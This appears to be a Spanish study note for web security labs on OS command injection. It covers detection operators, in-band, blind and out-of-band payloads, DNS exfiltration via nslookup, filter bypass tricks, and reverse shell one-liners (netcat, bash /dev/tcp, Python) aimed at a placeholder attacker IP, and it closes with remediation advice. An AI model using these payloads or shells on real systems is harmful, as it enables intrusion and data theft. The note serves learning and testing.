
---
Tags: #burpsuite #oob #os-command-injection

---
# Índice

[[#1. Conceptos Fundamentales]]
	[[#Impacto]]
	
[[#2. Metodología de Detección]]
	[[#Operadores de encadenamiento útiles]]
	
[[#3. Escenarios de Explotación]]
	[[#A. Inyección de Comandos Directa (In-band)]]
	[[#B. Inyección Ciega (Blind) - Time Based]]
	[[#C. Inyección Ciega con Redirección de Salida]]
	[[#D. Inyección Ciega vía OOB (Out-of-Band)]]
	
[[#4. Técnicas de Bypass y Evasión]]
	[[#Bypass de Espacios]]
	[[#Bypass de Listas Negras (Comandos prohibidos)]]
	
[[#5. Elevación Reverse Shells]]
	
[[#6. Prevención (Remediación)]]

---
## 1. Conceptos Fundamentales

La **Inyección de Comandos de Sistema Operativo** (también conocida como Shell Injection) es una vulnerabilidad crítica que permite a un atacante ejecutar comandos arbitrarios en el servidor que corre una aplicación.

Esto sucede cuando una aplicación pasa datos suministrados por el usuario (formularios, cookies, cabeceras HTTP) a una **shell del sistema** (como `bash` o `cmd.exe`) sin una validación o saneamiento adecuado.

### Impacto

- Control total sobre el servidor.
    
- Exfiltración de datos sensibles.
    
- Pivoting (usar el servidor para atacar la red interna).
    

---

## 2. Metodología de Detección

Para identificar esta vulnerabilidad, debemos probar cómo reacciona el backend ante **operadores de control** de shell.

### Operadores de encadenamiento útiles:

|**Operador**|**Sistema**|**Descripción**|
|---|---|---|
|`;`|Linux/Unix|Ejecuta el segundo comando después del primero.|
|`&`|Ambos|Ejecuta en segundo plano (útil en blind).|
|`&&`|Ambos|Ejecuta el segundo solo si el primero tiene éxito.|
|`\|`|Ambos|Pasa la salida del primero al segundo.|
|`\|`|Ambos|Ejecuta el segundo solo si el primero falla.|
|`\n` (0x0a)|Linux|Nueva línea (salto de línea).|
|`` ` ``|Linux|Sustitución de comandos (backticks).|
|`$( )`|Linux|Sustitución de comandos (preferido).|

---
## 3. Escenarios de Explotación

### A. Inyección de Comandos Directa (In-band)

El caso más simple: la aplicación devuelve la salida del comando directamente en la respuesta HTTP.

**Ejemplo:**

```HTTP
POST /product/stock HTTP/2
Content-Length: 28

productId=1&storeId=1; whoami
```

- **Resultado esperado:** El cuerpo de la respuesta contendrá el nombre del usuario (ej: `www-data`).
    

---
### B. Inyección Ciega (Blind) - Time Based

La aplicación no devuelve la salida en la respuesta. Confirmamos la vulnerabilidad provocando un retraso en la respuesta del servidor.

**Ejemplo:**

```HTTP
POST /feedback/submit HTTP/2
...
email=a@a.com; sleep 10; #
```

- **Nota:** Al igual que en _SQLi Time Based_ (donde usaríamos `pg_sleep(10)` en Postgres), aquí usamos comandos directos del sistema como `sleep`. Si la respuesta tarda exactamente 10 segundos, es vulnerable.
    

---
### C. Inyección Ciega con Redirección de Salida

Si no hay salida directa pero tenemos acceso a un directorio público (como `/var/www/images/`), podemos escribir el resultado en un archivo y luego leerlo vía navegador.

**Ejemplo:**

```Bash
# Inyección
email=a@a.com; whoami > /var/www/images/output.txt; #

# Acceso posterior
GET /images/output.txt
```

---
### D. Inyección Ciega vía OOB (Out-of-Band)

Usamos protocolos externos (DNS/HTTP) para confirmar la ejecución cuando el servidor está "blind" y no podemos escribir en disco.

**1. Interacción Simple (Confirmación):**

```Bash
email=a@a.com; nslookup subdominio.tu-colaborador.com; #
```

**2. Exfiltración de Datos (Data Leak):**

Usamos la sustitución de comandos para que el resultado de un comando sea parte de la consulta DNS.

```Bash
email=a@a.com; nslookup $(whoami).tu-colaborador.com; #
```

- **Resultado en tu servidor DNS:** Recibirás una consulta para `www-data.tu-colaborador.com`.
    

---
## 4. Técnicas de Bypass y Evasión

Cuando existen filtros básicos (WAF o listas negras), podemos intentar lo siguiente:

### Bypass de Espacios

Si el servidor bloquea el carácter de espacio:

- **Linux:** `${IFS}` (Internal Field Separator)
    
    - `cat${IFS}/etc/passwd`
        
- **Basado en Offset:** `$IFS$9`
    
- **Uso de Tabs:** `%09`
    

### Bypass de Listas Negras (Comandos prohibidos)

Si `cat` o `whoami` están prohibidos:

- **Variables vacías:** `w'h'o'a'm'i` o `w""hoami`
    
- **Slash invertido:** `w\hoami`
    
- **Codificación Base64:**
    
    - `echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash`
        

---
## 5. Elevación: Reverse Shells

Una vez confirmada la inyección, el siguiente paso suele ser obtener una shell interactiva. Aquí tienes los "one-liners" más efectivos:

### A. Netcat (Si está instalado el binario tradicional)

```Bash
; nc [TU_IP] [PUERTO] -e /bin/bash
```

### B. Bash (El más común en Linux)

```Bash
; bash -i >& /dev/tcp/[TU_IP]/[PUERTO] 0>&1
```

### C. Python (Muy fiable en entornos modernos)



```Bash
; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[TU_IP]",[PUERTO]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```


> [!TIP] **Importante:** Si el comando contiene caracteres especiales como `&`, recuerda URL-encodearlos en la petición HTTP (`&` -> `%26`).

---
## 6. Prevención (Remediación)

1. **Evitar llamar a funciones de shell:** Usar APIs integradas del lenguaje (ej: `os.File.Open()` en lugar de `cat`).
    
2. **Validación estricta:** Usar listas blancas (Allow-lists) para caracteres permitidos.
    
3. **Parametrización:** Si es inevitable usar comandos, pasar los argumentos de forma separada sin que pasen por el intérprete de shell.